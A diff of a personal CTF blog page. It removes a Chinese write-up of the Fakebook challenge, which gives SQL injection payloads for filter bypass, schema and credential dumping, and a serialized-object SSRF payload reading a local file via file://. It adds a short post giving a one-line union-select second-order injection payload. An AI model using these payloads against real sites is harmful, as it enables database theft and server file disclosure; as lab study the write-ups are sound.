@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">[网鼎杯 2018]Fakebook | Troy3e</title>
+  <title itemprop="name">October 2019 Twice SQL Injection | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,15 +185,15 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-196720.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-196720.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1127203.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1127203.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      [网鼎杯 2018]Fakebook</h1>
+      October 2019 Twice SQL Injection</h1>
       <p class="entry-census">
         <span>
           <a href="">
-            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg">
           </a>
         </span>
         <span>
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-7-4<span class="bull">
+        2021-1-31<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,16 +215,9 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>万万没想到robots.txt里面居然有东西，一开始一直以为漏洞在注册和登录之中，也没有用dir去扫。。。<br>源码：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704232149.png" alt><br>在注册的帐号的主界面存在注入点：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231304.png" alt><br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231339.png" alt><br>字段数为4：no=1 order by 4–+<br>union select被过滤了，新学习了一种绕过的方法：union/**/select</p>
-<p>注入点为2：no=1 union/**/select 1,2,3,4–+</p>
-<p>数据库为fakebook：no=0 union/**/select 1,database(),3,4–+</p>
-<p>表为users：no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+</p>
-<p>列为no,username,passwd,data：no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+</p>
-<p>查出数据：no=0%20union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231929.png" alt></p>
-<p>很明显data是一串序列化的代码，还原后得到：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/2016410-20200507215325049-962043420.png" alt><br>发现：这个正是源码中的UserInfo类<br>接下来再看之前找到的源码，这里有一个新的知识点：ssrf漏洞。<br>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。<br>一般由curl的滥用引起。<br>更多关于ssrf漏洞的介绍详见：<a href="https://www.jianshu.com/p/d1d1c40f6d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/d1d1c40f6d4c</a><br>说一下我自己的理解：<br>首先这个ssrf漏洞具体是如何判断出来的我暂且不去搞的非常明白，目前先记住看到curl就要联想到ssrf就行。在判断这里存在了ssrf漏洞之后，就要想办法去利用它进行flag的读取。<br>回到一开始的界面：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231304.png" alt><br>可以看到name、age、blog等信息，此时再看data那里反序列化后的结果，所有的信息都被藏在了data列里，猜测服务器是通过查询data字段,得到其中的序列化信息来渲染整个页面,从而恰好得到页面中的username,age,blog值。在猜想到这个逻辑之后，我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件。<br>利用flie协议读取文件：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200705000447.png" alt><br>最终payload：<a href="http://9ccd5c5c-9dea-4d09-87ab-06ac06819869.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}%27%20from%20users%20--+" target="_blank" rel="noopener">http://9ccd5c5c-9dea-4d09-87ab-06ac06819869.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}%27%20from%20users%20--+</a></p>
-<p>查看页面源代码，访问界面即可</p>
-<p>最后：这道题是一道综合性很强的题，用到了ssrf、反序列化、sql注入，难度还是比较大的。但是写的很乱，不知道能不能让读者理解我的意思。</p>
-<p>参考链接：<br>1、<a href="https://blog.csdn.net/qq_44657899/article/details/104884553" target="_blank" rel="noopener">https://blog.csdn.net/qq_44657899/article/details/104884553</a><br>1、<a href="https://www.cnblogs.com/hello-there/p/12846239.html" target="_blank" rel="noopener">https://www.cnblogs.com/hello-there/p/12846239.html</a></p>
+          <p>水了一题，本来以为这题挺难的想写篇博客，没想到是个送的二次注入。。</p>
+<p>0’ union select flag from flag#</p>
+<p>zzz</p>
 
         </div>
         <!-- .entry-content -->
@@ -256,15 +249,15 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2020/07/07/RoarCTF-2019-Easy-Java/" rel="prev">
+            <a href="/2077/12/10/Self-Introduction/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-542249.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-542249.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994291.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994291.png">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                [RoarCTF 2019]Easy Java</h3>
+                Self-Introduction（置顶）</h3>
                 <hr>
               </div>
             </a>
@@ -274,15 +267,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2020/07/04/强网杯-2019-高明的黑客（失败）/" rel="next">
+            <a href="/2021/01/29/FBCTF2019-Event/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-542508.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-542508.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1127195.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1127195.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [强网杯 2019]高明的黑客</h3>
+                [FBCTF2019]Event</h3>
                 <hr>
               </div>
             </a>
@@ -306,7 +299,7 @@
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
@@ -315,7 +308,7 @@
           </div>
         </div>
         <hr>
-        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+        <p><i class="iconfont icon-write"></i>steamID：888007034</p>
       </section>
     </main><!-- #main -->
   </div><!-- #primary -->
